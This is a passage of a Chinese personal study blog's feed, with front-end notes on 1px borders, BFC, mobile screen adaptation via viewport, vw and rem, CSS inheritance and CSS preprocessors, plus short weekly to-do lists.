class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">      &lt;title&gt;1px question&lt;/title&gt;</span><br><span class="line">      &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;</span><br><span class="line">      &lt;meta name=&quot;viewport&quot; id=&quot;WebViewport&quot; content=&quot;initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no&quot;&gt;        </span><br><span class="line">      &lt;style&gt;</span><br><span class="line">          html &#123;</span><br><span class="line">              font-size: 1px;</span><br><span class="line">          &#125;            </span><br><span class="line">          * &#123;</span><br><span class="line">              padding: 0;</span><br><span class="line">              margin: 0;</span><br><span class="line">          &#125;</span><br><span class="line">          .top_b &#123;</span><br><span class="line">              border-bottom: 1px solid #E5E5E5;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          .a,.b &#123;</span><br><span class="line">                      box-sizing: border-box;</span><br><span class="line">              margin-top: 1rem;</span><br><span class="line">              padding: 1rem;                </span><br><span class="line">              font-size: 1.4rem;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          .a &#123;</span><br><span class="line">              width: 100%;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          .b &#123;</span><br><span class="line">              background: #f5f5f5;</span><br><span class="line">              width: 100%;</span><br><span class="line">          &#125;</span><br><span class="line">      &lt;/style&gt;</span><br><span class="line">      &lt;script&gt;</span><br><span class="line">          var viewport = document.querySelector(&quot;meta[name=viewport]&quot;);</span><br><span class="line">          //下面是根据设备像素设置viewport</span><br><span class="line">          if (window.devicePixelRatio == 1) &#123;</span><br><span class="line">              viewport.setAttribute(&#x27;content&#x27;, &#x27;width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">          if (window.devicePixelRatio == 2) &#123;</span><br><span class="line">              viewport.setAttribute(&#x27;content&#x27;, &#x27;width=device-width,initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">          if (window.devicePixelRatio == 3) &#123;</span><br><span class="line">              viewport.setAttribute(&#x27;content&#x27;, &#x27;width=device-width,initial-scale=0.3333333333333333, maximum-scale=0.3333333333333333, minimum-scale=0.3333333333333333, user-scalable=no&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">          var docEl = document.documentElement;</span><br><span class="line">          var fontsize = 32* (docEl.clientWidth / 750) + &#x27;px&#x27;;</span><br><span class="line">          docEl.style.fontSize = fontsize;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">      &lt;div class=&quot;top_b a&quot;&gt;下面的底边宽度是虚拟1像素的&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;b&quot;&gt;上面的边框宽度是虚拟1像素的&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>总结</strong><br>优点：全机型兼容，直接写1px不能再方便<br>缺点：适用于新的项目，老项目可能改动大</p><h1 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在解释BFC之前，先说一下文档流。我们常说的文档流其实分为<font color="#FF8C00">定位流、浮动流、普通流</font>三种。而普通流其实就是指BFC中的FC。FC(Formatting Context)，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。常见的FC有BFC、IFC，还有GFC和FFC。</p><p>BFC(Block Formatting Context)块级格式化上下文，是用于布局块级盒子的一块渲染区域。MDN上的解释<font color="#FF8C00">：BFC是Web页面 CSS 视觉渲染的一部分，<strong>用于决定块盒子的布局</strong>及浮动相互影响范围的一个区域</font>。</p><p><strong>注意：</strong> <font color="#FF00FF">一个BFC的范围包含创建该上下文元素的所有子元素，但不包括创建了新BFC的子元素的内部元素</font>。这从另一方角度说明，一个元素不能同时存在于两个BFC中。<font color="#FF8C00">因为如果一个元素能够同时处于两个BFC中，那么就意味着这个元素能与两个BFC中的元素发生作用，就违反了BFC的隔离作用。</font></p><h2 id="三种文档流的定位方案"><a href="#三种文档流的定位方案" class="headerlink" title="三种文档流的定位方案"></a>三种文档流的定位方案</h2><h3 id="常规流-Normal-flow"><a href="#常规流-Normal-flow" class="headerlink" title="常规流(Normal flow)"></a>常规流(Normal flow)</h3><ul><li>在常规流中，盒一个接着一个排列;</li><li>在块级格式化上下文里面， 它们竖着排列；</li><li>在行内格式化上下文里面， 它们横着排列;</li><li><font color="#FF00FF">当position为static或relative，并且float为none时会触发常规流</font>；</li><li>对于静态定位(static positioning)，position: static，盒的位置是常规流布局里的位置；</li><li>对于相对定位(relative positioning)，position: relative，盒偏移位置由top、bottom、left、right属性定义。即使有偏移，仍然保留原有的位置，其它常规流不能占用这个位置。</li></ul><h3 id="浮动-Floats"><a href="#浮动-Floats" class="headerlink" title="浮动(Floats)"></a>浮动(Floats)</h3><ul><li>左浮动元素尽量靠左、靠上，右浮动同理</li><li>这导致常规流环绕在它的周边，除非设置 clear 属性</li><li>浮动元素不会影响块级元素的布局</li><li>但浮动元素会影响行内元素的布局，让其围绕在自己周围，撑大父级元素，从而间接影响块级元素布局</li><li>最高点不会超过当前行的最高点、它前面的浮动元素的最高点</li><li>不超过它的包含块，除非元素本身已经比包含块更宽</li><li>行内元素出现在左浮动元素的右边和右浮动元素的左边，左浮动元素的左边和右浮动元素的右边是不会摆放浮动元素的</li></ul><h3 id="绝对定位-Absolute-positioning"><a href="#绝对定位-Absolute-positioning" class="headerlink" title="绝对定位(Absolute positioning)"></a>绝对定位(Absolute positioning)</h3><ul><li>绝对定位方案，盒从常规流中被移除，不影响常规流的布局；</li><li>它的定位相对于它的包含块，相关CSS属性：top、bottom、left、right；</li><li>如果元素的属性position为absolute或fixed，它是绝对定位元素；</li><li>对于position: absolute，元素定位将相对于上级元素中最近的一个relative、fixed、absolute，如果没有则相对于body；</li></ul><h2 id="BFC触发方式"><a href="#BFC触发方式" class="headerlink" title="BFC触发方式"></a>BFC触发方式</h2><ul><li>根元素，即HTML标签</li><li>浮动元素：float值为left、right</li><li>overflow值不为 visible，为auto、scroll、hidden</li><li>display值为inline-block、table-cell、table-caption、table、inline-table、flex、inline-flex、grid、inline-grid</li><li>定位元素：position值为absolute、fixed</li></ul><p><strong>注意：</strong> <font color="#FF00FF">display:table也可以生成BFC的原因在于Table会默认生成一个匿名的table-cell，是这个匿名的table-cell生成了BFC。</font></p><h2 id="约束规则"><a href="#约束规则" class="headerlink" title="约束规则"></a>约束规则</h2><p><strong>浏览器对BFC区域的约束规则：</strong></p><ol><li>生成BFC元素的子元素会一个接一个的放置。</li><li>垂直方向上他们的起点是一个包含块的顶部，两个相邻子元素之间的垂直距离取决于元素的margin特性。在BFC中相邻的块级元素的外边距会折叠(Mastering margin collapsing)</li><li>生成BFC元素的子元素中，每一个子元素左外边距与包含块的左边界相接触（对于从右到左的格式化，右外边距接触右边界），即使浮动元素也是如此（尽管子元素的内容区域会由于浮动而压缩），除非这个子元素也创建了一个新的BFC（如它自身也是一个浮动元素）。</li></ol><p><strong>规则解读：</strong></p><ol><li>内部的Box会在垂直方向上一个接一个的放置</li><li>内部的Box垂直方向上的距离由margin决定。（完整的说法是：属于同一个BFC的两个相邻Box的margin会发生折叠，不同BFC不会发生折叠。）</li><li>每个元素的左外边距与包含块的左边界相接触（从左向右），即使浮动元素也是如此。（这说明BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界）</li><li>BFC的区域不会与float的元素区域重叠</li><li>计算BFC的高度时，浮动子元素也参与计算</li></ol><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p><strong>BFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素</strong>，反之亦然。我们可以利用BFC的这个特性来做很多事。</p><ol><li>阻止元素被浮动元素覆盖<br>一个正常文档流的block元素可能被一个float元素覆盖，挤占正常文档流，因此可以设置一个元素的float、 display、position值等方式触发BFC，以阻止被浮动盒子覆盖。</li><li>可以包含浮动元素<br>通过改变包含浮动子元素的父盒子的属性值，触发BFC，以此来包含子元素的浮动盒子。</li><li>阻止因为浏览器因为四舍五入造成的多列布局换行的情况<br>有时候因为多列布局采用小数点位的width导致因为浏览器因为四舍五入造成的换行的情况，可以在最后一 列触发BFC的形式来阻止换行的发生。比如下面栗子的特殊情况</li><li>阻止相邻元素的margin合并<br>属于同一个BFC的两个相邻块级子元素的上下margin会发生重叠，(设置writing-mode:tb-rl时，水平 margin会发生重叠)。所以当两个相邻块级子元素分属于不同的BFC时可以阻止margin重叠。<br>这里给任一个相邻块级盒子的外面包一个div，通过改变此div的属性使两个原盒子分属于两个不同的BFC，以此来阻止margin重叠。</li></ol><h1 id="移动端适配方案"><a href="#移动端适配方案" class="headerlink" title="移动端适配方案"></a>移动端适配方案</h1><p><strong>适配思路</strong><br>设计稿（750*1334） —&gt; 开发 —&gt; 适配不同的手机屏幕，使其显得合理</p><p><strong>原则</strong><br>开发时方便，写代码时设置的值要和标注的 160px 相关<br>方案要适配大多数手机屏幕，并且无 BUG<br>用户体验要好，页面看着没有不适感</p><p><strong>思路</strong><br>写页面时，按照设计稿写固定宽度，最后再统一缩放处理，在不同手机上都能用<br>按照设计稿的标准开发页面，在手机上部分内容根据屏幕宽度等比缩放，部分内容按需要变化，需要缩放的元素使用 rem, vw 相对单位，不需要缩放的使用 px<br>固定尺寸+弹性布局，不需要缩放</p><p><strong>viewport 适配</strong><br>根据设计稿标准（750px 宽度）开发页面，写完后页面及元素自动缩小，适配 375 宽度的屏幕</p><p>在 head 里设置如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=750,initial-scale=0.5&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>initial-scale = 屏幕的宽度 / 设计稿的宽度</strong><br>为了适配其他屏幕，需要动态的设置 initial-scale 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const WIDTH = 750</span><br><span class="line">    const mobileAdapter = () =&gt; &#123;</span><br><span class="line">      let scale = screen.width / WIDTH</span><br><span class="line">      let content = `width=$&#123;WIDTH&#125;, initial-scale=$&#123;scale&#125;, maximum-scale=$&#123;scale&#125;, minimum-scale=$&#123;scale&#125;`</span><br><span class="line">      let meta = document.querySelector(&#x27;meta[name=viewport]&#x27;)</span><br><span class="line">      if (!meta) &#123;</span><br><span class="line">        meta = document.createElement(&#x27;meta&#x27;)</span><br><span class="line">        meta.setAttribute(&#x27;name&#x27;, &#x27;viewport&#x27;)</span><br><span class="line">        document.head.appendChild(meta)</span><br><span class="line">      &#125;</span><br><span class="line">      meta.setAttribute(&#x27;content&#x27;,content)</span><br><span class="line">    &#125;</span><br><span class="line">    mobileAdapter()</span><br><span class="line">    window.onorientationchange = mobileAdapter //屏幕翻转时再次执行</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p><strong>缺点就是边线问题，不同尺寸下，边线的粗细是不一样的（等比缩放后），全部元素都是等比缩放，实际显示效果可能不太好</strong></p><p><strong>vw 适配（部分等比缩放）</strong></p><ol><li>开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标注是基于此宽度标注）</li><li>开始开发，对设计稿的标注进行转换，把px换成vw。比如页面元素字体标注的大小是32px，<font color="#FF00FF">换成vw为 (100/750)*32 vw</font></li><li>对于需要等比缩放的元素，CSS使用转换后的单位</li><li>对于不需要缩放的元素，比如边框阴影，使用固定单位px</li></ol><p>关于换算，为了开发方便，利用自定义属性，CSS变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const WIDTH = 750</span><br><span class="line">    //:root &#123; --width: 0.133333 &#125; 1像素等于多少 vw</span><br><span class="line">    document.documentElement.style.setProperty(&#x27;--width&#x27;, (100 / WIDTH)) </span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p><strong>注意此时，meta 里就不要去设置缩放了</strong></p><p>业务代码里就可以写，实现了按需缩放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header &#123;</span><br><span class="line">  font-size: calc(28vw * var(--width))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>rem 适配</strong></p><p>开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标是基于此宽度标注）<br>开始开发，对设计稿的标注进行转换<br>对于需要等比缩放的元素，CSS使用转换后的单位<br>对于不需要缩放的元素，比如边框阴影，使用固定单位px</p><p>假设设计稿的某个字体大小是 40px, 手机屏幕上的字体大小应为 420/750*40 = 22.4px (体验好)，换算成 rem（相对于 html 根节点，假设 html 的 font-size = 100px,）则这个字体大小为 0.224 rem，写样式时，对应的字体设置为 0.224 rem 即可，其他元素尺寸也做换算.</p><p><strong>但是有问题</strong><br>举个例子，设计稿的标注 是40px，写页面时还得去做计算，很麻烦（全部都要计算）<br>能不能规定一下，看到40px ,就应该写40/100 = 0.4 rem,这样看到就知道写多少了（不用计算），此时的html 的 font-size 就不能是 100px 了，应该为 (420*100)/750 = 56px，100为我们要规定的那个参数<br><strong>根据不同屏幕宽度，设置 html 的 font-size 值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    const WIDTH = 750 //设计稿尺寸</span><br><span class="line">    const setView = () =&gt; &#123;</span><br><span class="line">      document.documentElement.style.fontSize = (100 * screen.width / WIDTH) + &#x27;px&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    window.onorientationchange = setView</span><br><span class="line">    setView()</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">对于需要等比缩放的元素，CSS使用转换后的单位</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header &#123;</span><br><span class="line">  font-size: .28rem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">对于不需要缩放的元素，比如边框阴影，使用固定单位px</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">header &gt; span.active &#123;</span><br><span class="line">  color: #fff;</span><br><span class="line">  border-bottom: 2px solid rgba(255, 255, 255, 0.3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设 html 的 font size = 1px 的话，就可以写 28 rem 了，更方便了，但是浏览器对字体大小有限制，设为 1px 的话，在浏览器中是失效的，会以 12px（或者其他值） 做一个计算 , 就会得到一个很夸张的结果，所以可以把 html 写的大一些<br><strong>使用 sass 库时</strong><br>JS 处理还是一样的，但看着好看些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@function px2rem($px) &#123;</span><br><span class="line">  @return $px * 1rem / 100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header &#123;</span><br><span class="line">  font-size: px2rem(28);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的三种适配方案，都是等比缩放，放到 ipad 上时（设计稿以手机屏幕设计的），页面元素会很大很丑，有些场景下，并不需要页面整体缩放（viewport 自动处理的也很好了），所以有时只需要合理的布局即可。</p><p><strong><font color="#FF8C00">弹性盒适配（合理布局）</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;</span><br></pre></td></tr></table></figure><p>使用 flex 布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">section &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><font color="#FF00FF">总结一下，什么样的页面需要做适配（等比缩放）呢</font></strong></p><ol><li>页面中的布局是栅格化的</li></ol><p>换了屏幕后，到底有多宽多高很难去做设置，整体的都需要改变，所以需要整体的缩放</p><ol start="2"><li>头屏大图，宽度自适应，高度固定的话，对于不同的屏幕，形状就会发生改变（放到ipad上就变成长条了），宽度变化后，高度也要保持等比例变化</li><li>大屏，需要适配很多的电视尺寸，要求撑满屏幕，不能有滚动条，此时若换个屏幕</li></ol><p>此时需要考虑小元素用 vh, 宽和高都用 vh 去表示，中间的大块去自适应，这就做到了大屏的适配，屏幕变小了，整体变小了（体验更好），中间这块撑满了屏幕</p>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>未完成的List</title>
    <link href="https://merlynr.github.io/2022/08/05/%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84List-DESKTOP-B0TSPR2/"/>
    <id>https://merlynr.github.io/2022/08/05/%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84List-DESKTOP-B0TSPR2/</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2022-08-04T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h1><h2 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h2><ul><li><input disabled="" type="checkbox"> CSS新样式未写完</li><li><input disabled="" type="checkbox"> Promise概念未梳理完</li><li><input disabled="" type="checkbox"> 基本算法</li></ul><h2 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h2><ul><li><input disabled="" type="checkbox"> 基础算法</li><li><input disabled="" type="checkbox"> 腾讯的小红</li></ul>]]></content>
    
    
    <summary type="html">每周学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="weekly" scheme="https://merlynr.github.io/tags/weekly/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>未完成的List</title>
    <link href="https://merlynr.github.io/2022/08/05/%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84List/"/>
    <id>https://merlynr.github.io/2022/08/05/%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84List/</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2022-08-04T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h1><h2 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h2><ul><li><input disabled="" type="checkbox"> CSS新样式未写完</li><li><input disabled="" type="checkbox"> Promise概念未梳理完</li><li><input disabled="" type="checkbox"> 基本算法</li></ul><h2 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h2><ul><li><input disabled="" type="checkbox"> 正则表达式</li><li><input disabled="" type="checkbox"> <a href="https://www.nowcoder.com/question/next?pid=39959332&qid=2589591&tid=59350717">一道未完成的算法题</a></li><li><input disabled="" type="checkbox"> 力扣451</li><li><input disabled="" type="checkbox"> http1/2/3</li><li><input disabled="" type="checkbox"> BFC</li><li><input disabled="" type="checkbox"> webpack 和 Vite 和 Rollup 有啥区别</li><li><input disabled="" type="checkbox"> <a href="https://v2.cn.vuejs.org/v2/guide/components.html#data-%E5%BF%85%E9%A1%BB%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0">为什么vue中data为函数</a></li><li><input disabled="" type="checkbox"> pwa</li><li><input disabled="" type="checkbox"> vm.$nextTick。</li><li><input disabled="" type="checkbox"> vue的回收机制</li><li><input disabled="" type="checkbox"> vue-loader+webpack,,,vite</li><li><input disabled="" type="checkbox"> git的使用</li></ul><p>早上 vue2，下午vue3，晚上计算机基础；js几个重要功能复现<br>明天上午基本算法，设计模型；下午项目</p>]]></content>
    
    
    <summary type="html">每周学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="weekly" scheme="https://merlynr.github.io/tags/weekly/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>CSS(第十天)</title>
    <link href="https://merlynr.github.io/2022/08/04/CSS(%E7%AC%AC%E5%8D%81%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/04/CSS(%E7%AC%AC%E5%8D%81%E5%A4%A9)/</id>
    <published>2022-08-03T16:00:00.000Z</published>
    <updated>2022-08-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="继承相关"><a href="#继承相关" class="headerlink" title="继承相关"></a>继承相关</h1><p>css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。</p><h2 id="无继承性的属性"><a href="#无继承性的属性" class="headerlink" title="无继承性的属性"></a>无继承性的属性</h2><ol><li><p>display：规定元素应该生成的框的类型</p></li><li><p>文本属性：<br>vertical-align：垂直文本对齐<br>text-decoration：规定添加到文本的装饰<br>text-shadow：文本阴影效果<br>white-space：空白符的处理<br>unicode-bidi：设置文本的方向</p></li><li><p>盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left</p></li><li><p>背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment</p></li><li><p>定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index</p></li><li><p>生成内容属性：content、counter-reset、counter-increment</p></li><li><p>轮廓样式属性：outline-style、outline-width、outline-color、outline</p></li><li><p>页面样式属性：size、page-break-before、page-break-after</p></li><li><p>声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during</p><h2 id="有继承性的属性"><a href="#有继承性的属性" class="headerlink" title="有继承性的属性"></a>有继承性的属性</h2></li><li><p>字体系列属性<br>font：组合字体<br>font-family：规定元素的字体系列<br>font-weight：设置字体的粗细<br>font-size：设置字体的尺寸<br>font-style：定义字体的风格<br>font-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。<br>font-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。<br>font-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。</p></li><li><p>文本系列属性<br>text-indent：文本缩进<br>text-align：文本水平对齐<br>line-height：行高<br>word-spacing：增加或减少单词间的空白（即字间隔）<br>letter-spacing：增加或减少字符间的空白（字符间距）<br>text-transform：控制文本大小写<br>direction：规定文本的书写方向<br>color：文本颜色 a元素除外</p></li><li><p>元素可见性：visibility</p></li><li><p>表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout</p></li><li><p>列表布局属性：list-style-type、list-style-image、list-style-position、list-style</p></li><li><p>生成内容属性：quotes</p></li><li><p>光标属性：cursor</p></li><li><p>页面样式属性：page、page-break-inside、windows、orphans</p></li><li><p>声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation</p></li></ol><p><strong>所有元素可以继承的属性</strong></p><ul><li>元素可见性：visibility</li><li>光标属性：cursor</li></ul><p><strong>内联元素可以继承的属性</strong></p><ul><li>字体系列属性</li><li>除text-indent、text-align之外的文本系列属性</li></ul><p><strong>块级元素可以继承的属性</strong></p><ul><li>text-indent、text-align</li></ul><h1 id="css预处理工具"><a href="#css预处理工具" class="headerlink" title="css预处理工具"></a>css预处理工具</h1><blockquote><p><strong>CSS 预处理器</strong>是一个能让你通过预处理器自己独有的语法来生成CSS的程序。<br>css预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；</p></blockquote><p><strong>Sass：</strong><br>2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。</p><p><strong>Less：</strong><br>2009年</p><p>比较出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。</p><p><strong>Stylus：</strong><br>2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。</p><p><strong>比较</strong><br>首先 <font color="#FF8C00">Sass 和 Less 都使用的是标准的 CSS 语法</font>，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，<font color="#FF8C00">默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。</font></p><blockquote><p>h1 {<br>  color: #0982C1;<br>}</p></blockquote><p>这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式：</p><blockquote><p>h1<br>color: #0982c1</p></blockquote><p>而 <font color="#FF8C00">Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名</font>，下面是 Stylus 支持的语法</p><blockquote><p>/* style.styl <em>/<br>h1 {<br>  color: #0982C1;<br>}<br>/</em> omit brackets <em>/<br>h1<br>color: #0982C1;<br>/</em> omit colons and semi-colons */<br>h1<br>color #0982C1</p></blockquote><p>可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错：</p><blockquote><p>h1 {<br>  color #0982c1<br>}<br>h2<br>font-size: 1.2em</p></blockquote><h1 id="行内元素和块级元素什么区别，然后怎么相互转换"><a 